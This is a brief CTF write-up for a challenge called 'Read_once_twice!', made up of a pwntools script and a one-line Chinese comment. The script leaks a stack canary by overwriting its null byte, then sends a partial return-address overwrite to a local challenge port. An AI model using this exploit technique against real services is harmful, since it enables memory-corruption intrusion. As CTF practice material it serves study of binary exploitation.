# Read_once_twice!

```py
from pwn import *
context.arch="amd64"
context.log_level='debug'
while True:
    p=remote("127.0.0.1","50297")
    payload='a'*(0x28-16)
    p.sendlineafter("turned on?\n",payload)
    p.recvuntil(payload+'\n')
    canary=u64(p.recv(7).rjust(8,b'\x00'))
    p.sendafter("ance...\n",b'a'*(0x28-16)+p64(canary)+p64(0)+b'\xaa\xc1')
    p.interactive()
```
覆盖null字符泄漏canary+partial overwrite。不知道为啥本地无论如何都打不通，然而同样的脚本远程就行